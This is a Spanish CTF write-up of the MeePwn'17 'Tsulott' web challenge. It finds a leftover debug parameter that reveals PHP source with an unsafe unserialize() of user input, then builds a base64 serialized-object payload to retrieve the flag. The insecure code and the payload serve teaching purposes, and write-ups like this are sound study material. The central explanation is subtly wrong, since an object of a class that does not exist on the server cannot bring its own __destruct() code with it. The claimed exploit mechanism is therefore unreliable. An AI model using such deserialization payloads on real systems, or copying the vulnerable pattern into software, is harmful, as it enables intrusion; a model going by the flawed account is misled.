---
layout: post
title:  "Meepwn Tsulott"
date:	2017-09-28 14:19:38 +0200
author: foo
categories: es ctf meepwn write-up
lang: es
ref: meepwn-web
---


Hace mucho tiempo que no escribo nada aquí, así que quizá ya es hora de arreglar eso...

---

**NOTA: Si quieres probar este reto por tu cuenta,
[aquí](/assets/posts/2017-09-28-meepwn-web/code.tar.gz) están todos los materiales
necesarios para hacerlo (aunque tendrás que ponerlo en un servidor que soporte PHP,
puesto que no funcionará si no).**

---


Este es el write-up del único reto que completé en el
[MeePwn'17 CTF](https://ctftime.org/event/486). Por alguna razón, la página no paraba de
decirme que "dejara de spamear flags" mientras intentaba subir la solución; así que
simplemente me di por vencido y me puse a otra cosa.

De cualquier modo, el primer reto que miré era el titulado _Tsulott_. La página web en la
que hay que buscar la bandera parece muy bonita:

{% include image.html
	src="/assets/posts/2017-09-28-meepwn-web/first_recon.png"
	title="Página web"
	alt="Primer reconocimiento de la página web"
%}

La primera cosa que hay que hacer es mirar en el HTML, ya que muchos de estos retos son
simples y, normalmente, hay comentarios con pistas. En este caso, hay un comentario al
final de la página que nos hace pensar que hay una opción de depuración (_debug_) y
alguien se olvidó de quitarla en producción:
```html
<center>
<font color='white'>-----------------------------------------------------------------------------------------------------------------------------</font>
<h3><font color='white'>Take code</font></h3><p>
<p><font color='white'>Pick your six numbers (Ex: 15 02 94 11 88 76)</font><p>
<form>
      <input type="text" name="gen_code" maxlength="17" /><p><p>
      <button type="submit" name="btn-submit" value="go">send</button>
</form>
</center>
<!-- GET is_debug=1 -->
</body>
```

Cosas como esta pueden pasar (aunque no tan obvias como aquí, pero aún así...), y podemos
aprovecharnos del error de alguien simplemente haciendo una petición a
`[url]/?is_debug=1`. Y _violà_, aquí está el código del servidor:

{% include image.html
	src="/assets/posts/2017-09-28-meepwn-web/code.png"
	title="Opción de depuración puesta a 1"
	alt="Respuesta del servidor cuando 'is_debug' está a 1"
%}

Ahora tenemos que examinar este nuevo código PHP:

{% highlight php linenos %}
<?php
    class Object
    {
        var $jackpot;
        var $enter;
    }
?>


<?php

    include('secret.php');

    if (isset ($_GET ['input']))
    {
        $obj = unserialize (base64_decode ($_GET ['input']));

        if ($obj)
        {
            $obj->jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99);

            if ($obj->enter === $obj->jackpot)
            {
                echo "<center><strong><font color='white'>"
                    . "CONGRATULATION! You Won JACKPOT PriZe !!!"
                    . "</font></strong></center>"
                    . "<br><center><strong>"
                    . "<font color='white' size='20'>"
                    . $obj->jackpot
                    . "</font></strong></center>";

                echo "<br><center><strong><font color='green' size='25'>"
                    . $flag . "</font></strong></center><br>";

                echo "<center><img "
                    . "src='http://www.relatably.com/m/img/"
                    . "cross-memes/5378589.jpg' /></center>";
            }
            else
            {
                echo "<br><br><center><strong>"
                    . "<font color='white'>Wrong! True Six "
                    . "Numbers Are: </font></strong></center>"
                    . "<br><center><strong><font color='white'"
                    . " size='25'>"
                    . $obj->jackpot
                    . "</font></strong></center><br>";
            }
        }
        else
        {
            echo "<center><strong><font color='white'>- Something wrong,"
                . " do not hack us please! -</font></strong></center>";
        }
    }
    else
    {
        echo "";
    }
?>

<?php
    if (isset ($_GET ['gen_code']) && !empty ($_GET ['gen_code']))
    {
        $temp = new Object;
        $temp->enter = $_GET ['gen_code'];

        $code = base64_encode (serialize ($temp));

        echo '<center><font color=\'white\'>Here is your code,"
            . " please use it to Lott: <strong>'
            . $code. '</strong></font></center>';
    }
?>

<?php
    if (isset ($_GET ['is_debug']) && $_GET ['is_debug'] === '1')
    {
        show_source (__FILE__);
    }
?>
{% endhighlight %}


Tras un par de minutos leyendo este código, podemos ver que hay un fallo en el modo de
manejar la entrada de usuario, que no es tratada correctamente (línea 16). Podemos
aprovecharnos de la deserialización para
[inyectar un objeto](https://www.owasp.org/index.php/PHP_Object_Injection), codificado en
Base64 y pasado usando el parámetro `input`.

Esta vulnerabilidad funciona del siguiente modo:

  - Creamos una clase, `Exploit`, que implementa sólo un método: `__destruct ()`. Este
	método será llamado cuando el objeto se destruya. El código de dentro puede ser tan
	sencillo como `var_dump ($flag);`

  - Un objeto, instancia de esta nueva clase, es serializado y codificado en Base64. Este
	será el valor del parámetro `input`.

  - El servidor recibe la cadena en Base64 y, tras decodificarla, llama al método
	`unserialize ()`. Este método crea un nuevo objeto con la información almacenada en
	esta cadena. En este caso, una instance de nuestra nueva clase es creada y, al
	destruirse, invoca al método `__destruct ()` que muestra el contenido de la bandera.


Aquí está la creación del _exploit_ y el resultado final:
```php
$ php -a
Interactive mode enabled

php > class Exploit
php > {
php {	function __destruct ()
php {	{
php {		var_dump ($flag);
php {	}
php { }
php > echo base64_encode (serialize (new Exploit ()));
PHP Notice:  Undefined variable: flag in php shell code on line 5
NULL
Tzo3OiJFeHBsb2l0IjowOnt9
php >
```

Cuando se accede a `/?input=Tzo3OiJFeHBsb2l0IjowOnt9`, obtenemos la bandera:


{% include image.html
	src="/assets/posts/2017-09-28-meepwn-web/flag.png"
	title="Exploit en acción"
	alt="Respuesta del servidor al exploit, con la bandera"
%}

Finalmente, la bandera es `MeePwnCTF{__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___}`.


Me gustaría haber podido probar el resto de retos; pero, por desgracia, la página no me
dejaba subir las banderas. Sin embargo, me lo pasé bien con este reto y aprendí algo, así
que al menos dejé el CTF con buena impresión.
